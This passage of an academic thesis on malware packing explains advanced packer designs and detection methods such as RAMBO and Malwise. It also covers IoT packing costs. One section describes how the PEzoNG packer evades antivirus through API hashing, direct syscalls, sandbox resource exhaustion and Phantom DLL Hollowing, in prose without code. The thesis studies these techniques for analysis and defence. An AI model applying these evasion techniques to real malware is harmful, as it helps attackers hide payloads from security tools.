where the first process acts as a debugger to the second to catch exceptions during execution. When the program attempts to execute the encrypted code, an exception is triggered because the required code is not present in the memory in its decrypted form. This exception is caught by the debugger process, which is monitoring the execution of the program. The debugger process then takes control and decrypts the required page of memory, making the decrypted code available for execution. This decrypted code is loaded into the memory of the program, replacing the encrypted version. As a result, the program can now execute the previously protected code.</p>","<p>To successfully understand and analyze complex packers like Themida and Armadillo, we need to employ more advanced strategies and techniques. In the next chapters, we will explore these advanced approaches, enabling us to effectively analyze and comprehend the inner workings of complex packers.</p>",{"id":"7.1 Advanced Packing Techniques","title":"<h3>7.1 Advanced Packing Techniques</h3>","body":["<p>As can be seen, such a complex packer that implements several anti-analysis and evasion techniques cannot be analyzed in a simple way as seen in the previous examples and they require different strategies. The following chapters will discuss advanced strategies for analyzing and understanding the implementation of packed malware with advanced packing strategies.</p>","<p><i>“More complex packers often involve several layers of unpacking routines, in which the first layer unpacks the second one, which in turn unpacks another routine, until the original code is reconstructed at the end of the chain. Others employ several parallel processes, they interleave the execution of unpacking code with the original code, or even incrementally unpack and re-pack the code on-demand before and after its execution <sup>[93]</sup>”</i>.</p>","<p>Following a subset of advanced unpacking techniques presented in the paper “SoK: Deep Packer Inspection: A Longitudinal Study of the Complexity of Run-Time Packers”:</p>","<ol><li>Parallel Unpackers</li><li>Unpacking Frames</li><li>Code Visibility</li></ol>","<p><b>Parallel Unpackers</b> is a strategy where <i>“packers employ several processes in order to unpack the original code <sup>[9]</sup>”</i>. These processes can interact with one another to perform various checks such as synchronization or time measurement to avoid detection and analysis.</p>","<p><img src=\\"/cyber/blog/thesis/57.png\\" alt=\\"\\"></p>","<p><b>Unpacking Frame</b> <i>“is a region of memory in which we observe a sequence of a memory write followed by a memory execution. Traditional run-time packers have one unpacking frame for each layer, because the code is fully unpacked in one layer before the next layers are unprotected. We call these packers single-frame unpackers. However, more complex cases exist in which the code of one layer is reconstructed and executed one piece at a time. These cases involve multiple frames per layer and are called multi-frame packers in our terminology <sup>[9]</sup>”</i>.</p>","<p><img src=\\"/cyber/blog/thesis/58.png\\" alt=\\"\\"></p>","<p><b>Code Visibility</b> is an <i>“advanced multi-frame examples exist that selectively unpack only the portion of code that is actually executed. This approach is used as a mechanism to prevent analysts and tools from easily acquiring a memory dump of the entire content of the binary <sup>[9]</sup>”</i>. There are different types of unpacking mechanism such as: Full -Code Unpacking which is a routine that unpack the entire code and executes it. Incremental Unpacking is an approach where the code in unpacked, if necessary, before being executed but not all the code are unpacked. Shifting-Decode Frames is a strategy where only one frame at a time is visible and unpacked and the previews unpacked frame are repacked to reduce the visibility.</p>","<p><img src=\\"/cyber/blog/thesis/59.png\\" alt=\\"\\"></p>"]},{"id":"7.2 Deep Dive into PEzoNG and Advanced Malware Packer","title":"<h3>7.2 Deep Dive into PEzoNG and Advanced Malware Packer</h3>","body":["<p>PEzoNG is a packer for Windows that implements various evasion techniques and anti-analysis mechanism. <i>“PEzoNG is built with modularity in mind and allows to add new features in a simple way by adding new modules that could implement different techniques with a fine grained detail <sup>[10]</sup>”</i>. In this way it is possible to add new techniques and implement additional feature to add to the packer and develop new evasion strategies. PEzoNG is a polymorphic packer which means that its signature changes from computation to computation which makes Anti Viruses that checks for trivial signature ineffective.</p>","<p>The image below shows an overview of the packing and unpacking overview of PEzoNG:</p>","<p><img src=\\"/cyber/blog/thesis/60.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/thesis/61.png\\" alt=\\"\\"></p>","<p>PEzoNG includes the following modules:</p>","<p><ol><li>Encryption</li><li>APIs</li><li>Syscall</li><li>Evasion</li><li>PE Loader</li><li>Shellcode Injeciton</li></ol></p>",{"id":"7.2.1 Encryption-Decryption Strategy","title":"<h4>7.2.1 Encryption/Decryption Strategy</h4>","body":["<p>PEzoNG uses a 256bit key and a python script t encrypt the malware and embeds the key in the header and different encryption algorithm can be selected. Also, the decryption happens in two stages as the encryption in order to avoid detection by Anti Viruses. As Anti Viruses can choose to run always one branch of if-else statements by changing the condition implementing the decryption accordingly can avoid the extraction of the malware. Antiviruses also tries to avoid performing high computation in order to maintain in order to maintain a smooth user experience.</p>","<p>The code below shows an example of a two-stage decryption with high computation:</p>","<p><img src=\\"/cyber/blog/thesis/62.png\\" alt=\\"\\"></p>","<p>The two if-else statement with the addition of a huge computation inside one of the branches prevent AVs from evaluating all the branches and the successful decryption of the malicious code.</p>"]},{"id":"7.2.2 APIs","title":"<h4>7.2.2 APIs</h4>","body":["<p>As malware packer uses several Windows APIs, many of them can be potentially flagged by security software as malicious and prevent a successful infection as their names are present in the IAT. To avoid such PEzoNG <i>“implemented an automatic functioncall obfuscation method which allows to dynamically resolveany Windows API address at run-time without ever specifying the API name <sup>[10]</sup>”</i>. The strategy consists in computing the hash value of the API names, the hash of a specific API then is checked with a computed hash of the function in the Process “Environment Block” that contains the names of the needed APIs.</p>","<p><i>“Since all the APIs used by PEzoNG belongs to two dynamic libraries ntdll.dll and kernelbase.dll which are always loaded by Windows into every process address space, all of them can be correctly resolved at run-time <sup>[10]</sup>”</i>. In this way the API names never appear in the PE file, and it avoids using “LoadLybrary” and “GetProcAddress” which are indicator of packing.</p>"]},{"id":"7.2.3 Systemcalls and Evations","title":"<h4>7.2.3 Systemcalls and Evations</h4>","body":["<p>PEzoNG, for some operations, invoke directly the system calls without relying on APIs with the help of “Syswhispers2 [11]”. For example, the API call VirtualAlloc uses the system call NtAllocateVirtualMemory and using directly the NT syscall avoid security software from user space hooking . This is possible due to the fact that <i>“in user-space Zw* functions (kernel-level functions) are at the same address of the corresponding Nt* function (user-level function) <sup>[10]</sup>”</i>. Reordering by address the Zw* function will provide the system call number  which is needed to perform the call.</p>"]},{"id":"7.2.4 Anti-Sandbox","title":"<h4>7.2.4 Anti-sandbox</h4>","body":["<p>PEzoNG make use of <i>“Offer you have to refuse <sup>[12]</sup>”</i> method. This method consists of using large number of resources such as memory or CPU, and as AVs have to analyze huge number of files, they cannot use cush amount of time and resources for a single file as it may lead to Denial of Service on the AV. </p>","<p>The following code are an example for memory and CPU usage:</p>","<p><img src=\\"/cyber/blog/thesis/63.png\\" alt=\\"\\"></p>"]},{"id":"7.2.5 Main Loader and Shellcode Injection","title":"<h4>7.2.5 Main Loader and Shellcode Injection</h4>","body":["<p>Once the malicious code has been decrypted the main loader prepare it for the execution. In the event of a shellcode injection the packer employs the “Phantom DLL Hollowing <sup>[34]</sup>” technique. <i>“Phantom Dll Hollowing looks for a dll on disk that has not already been loaded into memory and that is large enough to host the malicious payload. Once a feasible Dll is found, the loader opens the Dll using a transacted NTFS (TxF) <sup>[34]</sup>”</i>.  Phantom DLL Hollowing maps the victim DLL into the memory and inject the payload keeping intact the rest of the library.</p>","<p><img src=\\"/cyber/blog/thesis/64.png\\" alt=\\"\\"></p>","<p>With this technique PEzoNG make the payload stealthier and harder to detect as the payload is treated as a legitimate code. </p>","<p>To understand better this process, it is essential to introduce what Transacted NTFS is. Transacted NTFS is a feature of Windows that groups several operations in one single unit. If one of these operations fails all the others are considerate unsuccessful. In the case of PEzoNG it uses the Transacted NTFS feature to open the target DLL and inject the shellcode in the memory without modifying it in the disk and then the changes can be rolled-back without affecting the original file in the disk. In this way the injection is made only in the memory and not save in the disk.</p>"]},{"id":"7.2.6 Results","title":"<h4>7.2.6 Results</h4>","body":["<p>The following image shows the employed strategies against a few antiviruses if they can detect if the binary is malicious or not.</p>","<p><img src=\\"/cyber/blog/thesis/65.png\\" alt=\\"\\"></p>","<p>As we can see the PEzoNG was undetected by the antiviruses when employing unhooking technique and a combination of all of them. In other cases, a subset of antiviruses was able to detect the executable as malicious. We can state that PEzoNG is able to successfully pack malware and pass undetected by most of the antiviruses in commerce.</p>"]}]}]},{"id":"8 A possible solution for Advanced Packers Analysis","title":"<h2> <span style=\\"color:#da1953\\">A po</span>ssible solution for Advanced Packers Analysis</h2>","body":["<p>Multiple branch observation is a technique described in the paper \\"RAMBO: Run-time packer Analysis with multiple-branch observation <sup>[13]</sup>\\" that tries to solve code partitioning problems efficiently. This technic is particularly effective when malware implements code frames shifting techniques. <i>“These packers only reveal one code region at a time, decrypting only the code covered by a single execution path <sup>[13]</sup>”</i>.  This technique can also be used for advanced unpacking mechanisms implemented. The paper also discusses about the efficiency of the multiple path exploration the protected regions as it may generate overhead.</p>","<p><img src=\\"/cyber/blog/thesis/66.png\\" alt=\\"\\"></p>","<p><i>“This approach leverages dynamic trait analysis, symbolic execution and process snapshotting in order to explore execution path in depth first order <sup>[13]</sup>”</i>. The strategy mentioned is executed in two steps. In the first step we execute the malware sample in order to visit a single path  then we analyze the packer to identify the region where the code has been unpacked. In the second step we analyze the extracted code in order to find the information on how to execute a different path for a new portion of the code to be unpacked. We iterate these two steps until the packer finishes to extract all the portions of the code.</p>","<p><i>“Symbolic execution allows to evaluate a program over a set of symbolic inputs instead of concrete values. A constraint solver can evaluate the symbolic expression that must be satisfied to follow a given path, providing an appropriate set of values for each input variable <sup>[13]</sup>”</i>. Through the symbolic execution we can execute all the paths of the malware. But the problem of accessing the memory address remains as packers utilize indirect memory access (as shown in the image below) as an anti-analysis measure to hinder static and dynamic analysis techniques. By dynamically generating memory addresses or using complex memory access patterns, packers make it challenging for analysts to understand and track the packer\'s behaviour.</p>","<p><img src=\\"/cyber/blog/thesis/67.png\\" alt=\\"\\"></p>","<p>Sometimes it is necessary to stop the execution in a given time for example before a conditional jump or a change of a value, for this purpose it is really useful performing system snapshots. By stopping the execution at given time it will be possible to redirect un an unexecuted branch of the program. This approach has many limitations as the operating system must save different data structure and may incur in error restoring the previews state.</p>","<p>The last approach mentioned in the paper which is applied for Shifting-Decode-Frames is to identify the stub, in charge of encrypting and decrypting portion of codes. The strategy proposed is to apply the multiple path exploration only on the protected code avoiding the stub and the anti-analysis routines which are out of our interest. To achieve this, we must identify the first decrypted portion of the code and from analyzing it we may find hints how to explore the next path and decrypt the next portion of the code.</p>","<p>The paper proposes optimization that simplify the multiple path observation to unpack binaries. For example, one of the optimizations proposed is the inconsistent multipart exploration which consist in forcing, which is consistent with the last tainted jump, to void crushes before completing examining the code and, inconsistent with the previews path restriction. This strategy overcome the challenge when packers modify the way how a program executed and make it difficult to explore its branches as standard symbolic execution certain path may not be executed. In addition, to reduce the size and the overhead of the exploration of the various paths Multiple Branch Observation limit the explored code only to regions that may contain the original code of the malware.</p>","<p>To further reduce the overhead and the complexity is to consider the local and the global consistency it is necessary to apply logical and global consistency. <i>“This means that we respect the consistency within the regions that contain the original code of the binary, but we allow the variables in this region to adopt values that are inconsistent with the rest of the code <sup>[13]</sup>”</i>. The global consistency maintains coherence and compatibility across different parts of the code. It ensures that the findings and conclusions derived from analyzing various sections of the software align with each other and form a coherent understanding of the overall behaviour of the program.</p>","<p>These optimizations allow complex malware to be analyzed in a reasonable time and limited to only the portions of interest. Doing so reduces the analysis overhead to have greater accuracy in understanding the behaviour and extraction of encrypted portions from the packer. The multiple branch observation if used on malware packed with Themida as described above would greatly facilitate its analysis that would otherwise be extremely complex and time-consuming. additionally limiting the analysis to only the interested portions and thus avoiding analyzing code that deals with for example, code that does not unpack subsequent portions would further speed up the process.</p>"]},{"id":"9 Classification of Packed Files","title":"<h2> <span style=\\"color:#da1953\\">9 Cla</span>ssification of Packed Files</h2>","body":[{"id":"9.1 Introduction","title":"<h3>9.1 Introduction</h3>","body":["<p>To solve the problem of malware classification and its variant a system named Malwise [14] has been developed. This system classifies malware <i>“using a fast application-level emulator to reverse the code packing transformation, and two flowgraph matching algorithms to perform classification. An exact flowgraph matching algorithm is employed that uses string-based signatures and is able to detect malware with near real-time performance <sup>[14]</sup>”</i>.</p>","<p> The innovative technique that Malwise uses is the use of structuring and decompilation to generate malware signature. Structuring a malware consists in rearranging the code in a more understandable manner which helps to understand patterns and logical flow of it. Decompilation is used to convert the low-level code to a pseudo higher level for a better understanding of it and analysis.</p>","<p>The approach of Malwise to generate the signature is divided in two parts and they consist of “Exact Matching”, Malwise look for the exact match of a control flow graph from a malware database to classify the input binary, and “Approximate Matching” Malwise search for similarity between the input flow graph and the database to classify binaries respecting a given threshold.</p>"]},{"id":"9.2 Detecting Packin","title":"<h3>9.2 Detecting Packing</h3>","body":["<p>The first step is to understand if the malware employs packing techniques. This is done by computing the entropy of the input file as a packed file most like have high entropy compared to a non-packed one. <i>“If the binary is identified as being packed, then the dynamic analysis to perform automated unpacking proceeds. If the binary is not packed, then the static analysis commences immediately <sup>[14]</sup>”</i>.</p>"]},{"id":"9.3 Detect Code Extraction (Unpacking Completion)","title":"<h3>9.3 Detect Code Extraction (Unpacking Completion)</h3>","body":["<p>Malwise detects the OEP by tracking the memory writes <sup>[15]</sup>. The idea behind this technique discussed in Renovo [15] is that regardless the employed packing technique eventually the original code should be preset in the memory to be executed and the instruction pointer must jump to the address (OEP) of the extracted program to execute it at runtime.</p>","<p><img src=\\"/cyber/blog/thesis/68.png\\" alt=\\"\\"></p>","<p>Malwise improved this concept in the event of multi-layer packing and can identify precisely in which state the OEP will be revealed. The idea is that <i>“if there exist high entropy packed data that have not been used by the packer during execution, then they remain to be unpacked. To determine if a particular stage of unpacking represents the OEP, the entropy of new or unread memory in the process image is examined. Newly written memory is indicated by the shadow memory  for the current stage being unpacked. Unread memory is maintained globally, in a shadow memory for all stages. If the entropy of the analyzed data is low, then it is presumed that no more compressed or encrypted data are left to be unpacked. This heuristically indicates completion of unpacking <sup>[14]</sup>”</i>.</p>","<p><img src=\\"/cyber/blog/thesis/69.png\\" alt=\\"\\"></p>"]},{"id":"9.4 Static Analysis","title":"<h3>9.4 Static Analysis</h3>","body":["<p>The objective of the static analysis is to extract characteristics from the unpacked binary. The characteristics are then transformed in a higher-level representation that are suitable from string matching (signature). For such a purpose Exacts Flow Graph and Approximate Flow Graph matching are employed.</p>"]},{"id":"9.5 Exact Flow Graph Matching","title":"<h3>9.5 Exact Flow Graph Matching</h3>","body":["<p>Once the characteristics of the input binary has been extracted a higher level of control flow graph is created and its signature is also generated. The signature is then compared with the database of malware signatures (consisted of graph edges and ordered nodes) in search of isomorphism. The figure below shows and example of control flow graph and the signature of it.</p>","<p><img src=\\"/cyber/blog/thesis/70.png\\" alt=\\"\\"></p>"]},{"id":"9.6 Approximate Flow Graph","title":"<h3>9.6 Approximate Flow Graph</h3>","body":["<p>Using the approximate flow graph is possible to identify a greater number of malware variants compared to the previews matching technique. In this process structuring is used to generate signatures to compare the similarity with the signatures in the database. <i>“Structuring is the process of recovering high-level structured control flow from a control flow graph. The intuition behind using structuring as a signature is that similarities between malware variants are reflected by variants sharing similar high-level structured control flow <sup>[14]</sup>”</i>.</p>","<p>The reason of performing structuring of code is because malware variants have similarities at a higher-level representation of their structure and control flow. Structuring produces a string of characters representing the higher-level representation of the malware code block. Following an example of the signature generation:</p>","<p><img src=\\"/cyber/blog/thesis/71.png\\" alt=\\"\\"></p>","<p>Malwise uses a database containing the signature generate from flow graphs of known malware in string format. To classify an input binary the signature is then compared with the database in search of similarities. “For exact matching, the assignment is based on string equality. <i>\\"For approximate matching, a greedy assignment is made for the best approximate matching string where the similarity ratio is above 0.9 <sup>[14]</sup>\\"</i>”.</p>"]},{"id":"9.7 Similarity","title":"<h3>9.7 Similarity</h3>","body":["<p>The greedy match of 0.9 threshold is used to identify potential exact matches and in the final classification a threshold of 0.6 is used to identify malware variants. Both thresholds are used in the result for malware identification and a lower threshold is used for a broader match for flexibility and capture even slightly modified versions of malware.</p>","<p>The problem that arises from this approach is the match with several malwares. For such reason the similarity check process is divided in two stages. The stage is the search for uniqueness, the input malware is compared with the database to check if it’s a unique malware or has been already seen previously by comparing its extracted features. In the second step the remaining duplicated are compared with a lower threshold of 0.6 in search of similarities and malware variants. Only the exact matches or the matches above 0.6 are returned as a result of the searching process.</p>"]},{"id":"9.8 Evaluation","title":"<h3>9.8 Evaluation</h3>","body":["<p>The following tables shows the accuracy of Malwise in identifying the OEP of binaries (HOSTNAME.EXE and CALC.EXE) packed with different packers.</p>","<p><img src=\\"/cyber/blog/thesis/72.png\\" alt=\\"\\"></p>","<p><img src=\\"/cyber/blog/thesis/73.png\\" alt=\\"\\"></p>","<p>From the table we can see that Malwise has a great accuracy in finding the OEP even in cases of several layer of several layer of packing. Malwise failed the unpacking of CALC.EXE only when packed with “napck”, “expressor”, “telock”, and “pespin”. It failed 4 out of 14 packer which is an impressive result, and it was able in most of the cases to reveal more than 98% of the packed instructions.</p>","<p>The performance evaluation shows that thanks to the immersive speed of Malwise, as shown below, is suitable to be integrated into desktop anti malware systems.</p>","<p><img src=\\"/cyber/blog/thesis/74.png\\" alt=\\"\\"></p>"]}]},{"id":"10 Packers on Embedded Systems","title":"<h2><span style=\\"color:#da1953\\">10 Pa</span>ckers on Embedded Systems</h2>","body":[{"id":"10.1 Embedded Systems and IoT","title":"<h3>10.1Embedded Systems and IoT</h3>","body":["<p>With the emergence of IoT and Embedded Systems, malicious users have adapted to exploit these technologies for malicious purposes. In this regard, it is important how much and how packing impacts them.</p>","<p>The difference between Embedded System and IoT lies in connectivity. That is, an IoT device is connected to the Internet e.g., a washing machine or refrigerator that can offer real-time information. On the other hand, an embedded system is like a minicomputer build for a specific use case, equipped with minimal computing power, and it is not connected to the internet.</p>","<p>Normally an embedded system does not have an Internet connection, but an IoT embedder does, so an embedded system can be considered a subset of IoT. So, these types of devices can be used by malicious users to carry out further attacks or perform packing and unpacking of malware.</p>","<p>Theoretically it is possible to carry out cyber-attacks from a compromised IoT device, its only limitation would be the available device resources such as processing power and memory. More specifically if we talk about packing <i>“While packing, in general, helps reduce the size of the stored binary, the unpacking/decryption time increases the total instructions executed and leads to increased power consumption <sup>[56]</sup></i>”.</p>"]},{"id":"10.2 Performance Evaluation","title":"<h3>10.2 Performance Evaluation</h3>","body":["<p>The study experimented with two packers, AES Encryption and UPX, with the addition of a simple anti-debugging feature, time delay, <i>“when single-stepping a process through a debugger the wall clock differences between any two points will grow dramatically when compared to a native execution. Time based anti-debugging software can perform two time checks and infer that it is running under such conditions if unusual difference is detected [56]</sup></i>”.</p>","<p>The experiment was conducted against the embedded board, which consists of Intel XScale PXA255 400MHz CPU, 128MB SDRAM, 32MB Flash ROM, Embedded Linux (Kernel 2.4.19) and g++ was used to compile the executables. Its result proved that UPX several times faster that AES because of the AES decryption overhead also <i>“UPX is better than AES-encryption packing for reducing the startup time and invocation time on embedded systems with limited resources <sup>[56]</sup></i>”.</p>","<p>Regarding power consumption (W=V\xb7I\xb7t=Volt\xb7Ampere\xb7milliseconds), it was not possible to keep the electric current stable so there is a margin of error of \xb12%. UPX showed very low power consumption compared with AES. In this regard, AES can be optimized with power consumption reduction in mind.</p>","<p>The two programs binary that have been choose for these experiments are MD5 hashing algorithm and AES encryption algorithms. Their execution time and power consumption have been measured in different states such as with no packing, with UPX packing and AES packing. The table below shows the data from the experiment and the difference in the measurements.</p>","<p><img src=\\"/cyber/blog/thesis/75.png\\" alt=\\"\\"></p>"]},{"id":"10.4 IoT Embedded System for malware distribution","title":"<h3>10.4 IoT Embedded System for malware distribution</h3>","body":["<p>IoT Embedded Systems can be infected or used for malware distribution. Through the results obtained, it is possible to see how fast the execution of programs packed specially with UPX are. On average between the two programs (MD5 and AES), the average execution time is about 0.45sec. despite having significantly limited computation power. By compromising a device an attacker can use it to make lateral movement and infect other devices in the network.</p>","<p>This works particularly well in the case of polymorphic malware where each time after compromising a device it is possible to re-pack the malware so that it has a different signature to infect subsequent devices. This would increase the chances of infection and reduce detection by security systems.</p>","<p><img src=\\"/cyber/blog/thesis/76.png\\" alt=\\"\\"></p>"]},{"id":"10.5 Packing Limitations","title":"<h3>10.5 Packing Limitations</h3>","body":["<p>Given the reduced computational power, the packing algorithm cannot be the same as in standard computing systems. That is, the packer in an Embedded IoT system cannot implement all the evasion features and advanced anti-debugging techniques such as parallel execution and unpacking through different child processes or threads. This would drastically increase execution times. So, in this regard, malware and packers for these systems have to be crafted in a very specific way keeping in mind power consumption and execution time.</p>"]}]},{"id":"11 Conclusions","title":"<h2><span style=\\"color:#da1953\\">11 Co</span>nclusions</h2>","body":["<p>In this thesis we studied about malwares, in particular about malware packing and unpacking. We studied the basics of packing and unpacking techniques with a practical demonstration on how to unpack UPX and MPRESS packers. The virtual analysis environment was also described in order to replicate the demonstration and guidelines has been provided to safely test malware without risking infecting the host machine.</p>","<p>Furthermore, more advanced packing techniques has been studied to understand their behaviour and evasion techniques. The study of such packing, packer identification and unpacking techniques shows that although malware implement evasion techniques that are hard and time consuming to analyze, with the proposed advanced analysis techniques it is possible, with a moderate percentage of success rate, to analyze, identify and extract packed code.</p>","<p>Such operations by automatic analysis systems are also highly time consuming, so they are not always possible to completely apply and execute in a real-world scenario. With the advancement of technology and with the development with more efficient techniques, that will reduce the identification and analysis time, it will be possible to create a substantial database to detect packers and analyze them in a reasonable time to identify malware. Only then it will be possible to apply such systems for commercial purpose or in a relatively large network where countless files must be analyzed.</p>"]},{"id":"A Bibliography","title":"<h2><span style=\\"color:#da1953\\">A Bi</span>bliography</h2>","body":["<p>[1] Nirav Bhojani, Malware Analysis, Research Gate, Ethical Hacking At: Nirma University, October 2014, DOI: 10.13140/2.1.4750.6889.</p>","<p>[2] VMWare Workstation Pro, https://www.vmware.com/uk/products/workstation-pro.html, VMWare.</p>","<p>[3] PEStudio, https://pestudio.en.lo4d.com/windows, Marc Ochsenmeier</p>","<p>[4] Detect It Easy, https://github.com/horsicq/Detect-It-Easy, Hors.</p>","<p>[5] Ida Free, https://hex-rays.com/ida-free/, hex-rays.</p>","<p>[6] Scylla, https://github.com/NtQuery/Scylla, NtQuery.</p>","<p>[7] ByeongHo Jung1 Seong Il Bae, Chang Choi, Eul Gyu Im, Packer identification method based on byte sequences, John Wiley & Sons, 23 October 2018, DOI: 10.1002/cpe.5082.</p>","<p>[8] Stephen J. Bigelow, https://www.techtarget.com/searchsecurity/definition/micro-VM-micro-virtual-machine, TechTarget, December 2021.</p>","<p>[9] Packers Xabier Ugarte-Pedrero, Davide Balzarottiy, Igor Santos, Pablo G. Bringas, SoK: Deep Packer Inspection: A Longitudinal Study of the Complexity of Run-Time, in 2015 IEEE Symposium on Security and Privacy, 20 July 2015, DOI: 10.1109/SP.2015.46. </p>","<p>[11] Jackson T., Syswhispers2, https://github.com/jthuraisamy/</p>","<p>[12] Emeric Nasi, Bypass Antivirus Dynamic Analysis, Sevagas, 08/2014.</p>","<p>[13]  Xabier Ugarte-Pedrero, Davide Balzarotti, Igor Santos, and Pablo G. Bringas, RAMBO: Run-time packer Analysis with Multiple Branch Observation, Springer, Cham, 12 June 2016, https://doi.org/10.1007/978-3-319-40667-1_10.</p>","<p>[14] Silvio Cesare, Student Member, IEEE, Yang Xiang, Senior Member, IEEE, and Wanlei Zhou, Senior Member, Malwise—An Effective and Efficient Classification System for Packed and Polymorphic Malware, in IEEE transactions on computers, 19 March 2012, DOI: 10.1109/TC.2012.65.</p>","<p>[15] Min Gyung Kang, Pongsin Poosankam, and Heng Yin, Renovo: A Hidden Code Extractor for Packed Executables, WORM’07, November 2, 2007, ACM 978-1-59593-886-2/07/0011.</p>","<p>[16] Tom Brosch, Maik, Morgenstern, Runtime Packer: The Hidden Problem, Black Hat USA, January 2006.</p>","<p>[17] Symbolic execution, https://en.wikipedia.org/wiki/Symbolic_execution</p>","<p>[18]  Satyajit Daulaguphu, Exciting Journey Towards Import Address Table (IAT) of an Executable, https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/</p>","<p>[19] Themida, https://www.oreans.com/Themida.php, Oreans, Software Security and Licensing Solutions.</p>","<p>[20]  Arie Olshtein, Following the Scent of Trickgate: 6-Year-Old Packer Used to Deploy the Most Wanted Malware, Check Point Research, January 30, 2023. </p>","<p>[21] https://reverseengineering.stackexchange.com/questions/2142/what-is-import-reconstruction-and-why-is-it-necessary, Stack Exchange.</p>","<p>[22] Packed Malware Basics, Arridae Infosec Pvt. Ltd., Jan 08, 2020. </p>","<p>[23] Metamorphic Code, https://en.wikipedia.org/wiki/Metamorphic_code</p>","<p>[24] Debugger flow control: Hardware breakpoints vs software breakpoints http://www.nynaeve.net/?p=80</p>","<p>[25] Import table vs Import Address Table https://reverseengineering.stackexchange.com/questions/16870/import-table-vs-import-address-table</p>","<p>[26] Riccardo Meggiato, Themida, il tool che protegge gli eseguibili e piace ai malware, cybersecurity360, 25 Gen 2022.</p>","<p>[27] Commando VM, https://github.com/mandiant/commando-vm</p>","<p>[28] Symbolic Execution, https://en.wikipedia.org/wiki/Symbolic_execution, Wikipedia.</p>","<p>[29] Kurt Baker, Malware Analysis, crowdstrike, April 17, 2023.</p>","<p>[30] PE Format, https://learn.microsoft.com/en-us/windows/win32/debug/pe-format, Microsoft, 03-24-2023.</p>","<p>[31] Saurabh Dept., Advance Malware Analysis Using Static and Dynamic Methodology, IEEE, 19 December 2019, DOI: 10.1109/ICACAT.2018.8933769.</p>","<p>[32] ASPack, http://www.aspack.com/, StarForce Technologies Inc.</p>","<p>[33] Yuxin Gao, Zexin Lu, Yuqing Luo, Survey on malware anti-analysis Yuxin Gao, IEEE, 15 January 2015, DOI: 10.1109/ICICIP.2014.7010353.</p>","<p>[34] Forrest Orr, Phantom DLL Hollowing, Forrest-orr.net, Oct 19, 2020.</p>","<p>[35] Binlin Cheng, Jiang Ming, Jianmin Fu, Guojun Peng, Ting Chen, Xiaosong Zhang, Jean-Yves Marion, Towards Paving the Way for Large-Scale Windows Malware Analysis: Generic Binary Unpacking with Orders-of-Magnitude Performance Boost, 2018 ACM SIGSAC Conference, 15 October 2018, https://doi.org/10.1145/3243734.3243771.</p>","<p>[36] Min-Jae Kim, Jin-Young Lee, Hye-Young Chang, SeongJe Cho, Yongsu Park, Minkyu Park, Philip A. Wilsey, Design and Performance Evaluation of Binary Code Packing for Protecting Embedded Software against Reverse Engineering, IEEE, 07 June 2010, DOI: 10.1109/ISORC.2010.23.</p>","<p>[37] Alessandro Mantovani, Simone Aonzo, Xabier Ugarte-Pedrero, Alessio Merlo, Davide Balzarotti, Prevalence and Impact of Low-Entropy Packing Schemes in the Malware Ecosystem, Network and Distributed System Security (NDSS) Symposium, 23-26 February 2020, https://doi.org/10.14722/ndss.2020.24297.</p>","<p>[38] Wei Yan, Zheng Zhang, Nirwan Ansari, Revealing Packed Malware, IEEE, 07 October 2008, DOI: 10.1109/MSP.2008.126.</p>","<p>[39] Yuxin Gao, Zexin Lu, and Yuqing Luo, Survey on malware anti-analysis, Fifth International Conference on Intelligence Control and Information Processing, IEEE, 20 Aug 2014, DOI: 10.1109/ICICIP.2014.7010353.</p>","<p>[40] Donghwi Shin, Chaetae Im, Hyuncheol Jeong, Seungjoo Kim, Dongho Won, The New Signature Generation Method Based on an Unpacking Algorithm and Procedure for a Packer Detection, International Journal of Advanced Science and Technology, 7 February 2011.</p>","<p>[41] Robert Lyda, James Hamrock, Using Entropy Analysis to Find Encrypted and Packed Malware, in IEEE Security & Privacy, DOI: 10.1109/MSP.2007.48.</p>","<p>[42] Trivikram Muralidharan, Aviad Cohen, Noa Gerson, Nir Nissim, File Packing from the Malware Perspective: Techniques, Analysis Approaches, and Directions for Enhancements, ACM Computing, 03 December 2022, https://doi.org/10.1145/3530810.</p>","<p>[43] Li Sun, Steven Versteeg, Serdar Boztaş, Trevor Yann, Pattern Recognition Techniques for the Classification of Malware Packers, Springer, Berlin, Heidelberg, Australasian Conference on Information Security and Privacy (ACISP) 2010, https://doi.org/10.1007/978-3-642-14081-5_23.</p>","<p>[44] Xingwei Li, Zheng Shan, Fudong Liu, Yihang Chen, Yifan Hou, A Consistently-Executing Graph-Based Approach for Malware Packer Identification, IEEE, 23 April 2019, DOI: 10.1109/ACCESS.2019.2910268.</p>","<p>[45] Anitta Patience Namanya, Andrea Cullen, Irfan U. Awan, Jules Pagna Disso, The World of Malware: An Overview, in 2018 IEEE 6th International Conference on Future Internet of Things and Cloud (FiCloud), 11 September 2018, DOI: 10.1109/FiCloud.2018.00067.</p>","<p>[46] Philip O\'Kane; Sakir Sezer, Kieran McLaughlin, Obfuscation: The Hidden Malware, in IEEE Security & Privacy, 04 August 2011, DOI: 10.1109/MSP.2011.98.</p>","<p>[47] Gr\xe9goire Jacob, Paolo Milani Comparetti, Matthias Neugschwandtner, Christopher Kruegel & Giovanni Vigna, A Static, Packer-Agnostic Filter to Detect Similar Malware Samples, International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA) 2012, https://doi.org/10.1007/978-3-642-37300-8_6.</p>","<p>[48] Kesav Kancherla, Srinivas Mukkamala, Image visualization based malware detection, in 2013 IEEE Symposium on Computational Intelligence in Cyber Security (CICS), 16 September 2013, DOI: 10.1109/CICYBS.2013.6597204.</p>","<p>[49] Veeramani R, Nitin Rai, Windows API based Malware Detection and Framework Analysis, ACSAC \'20: Annual Computer Security Applications Conference, 08 December 2020, https://doi.org/10.1145/3427228.3427242.</p>","<p>[50] Jana Šťastn\xe1, Martin Tom\xe1šek, Exploring Malware Behaviour for Improvement of Malware Signatures, in 2015 IEEE 13th International Scientific Conference on Informatics, 11 January 2016, DOI: 10.1109/Informatics.2015.7377846.</p>","<p>[51] Fanglu Guo, Peter Ferrie, Tzi-cker Chiueh, A Study of the Packer Problem and Its Solutions, International Workshop on Recent Advances in Intrusion Detection (RAID) 2018, Springer, Berlin, Heidelberg, https://doi.org/10.1007/978-3-540-87403-4_6.</p>","<p>[52] Binlin Cheng ,Jiang Ming, Jianmin Fu, Guojun Peng, Ting Chen, Xiaosong Zhang, Jean-Yves Marion, Towards Paving the Way for Large-Scale Windows Malware Analysis: Generic Binary Unpacking with Orders-of-Magnitude Performance Boost, CCS \'18: Proceedings of the 2018 ACM SIGSAC Conference on Computer and Communications Security, 15 October 2018, 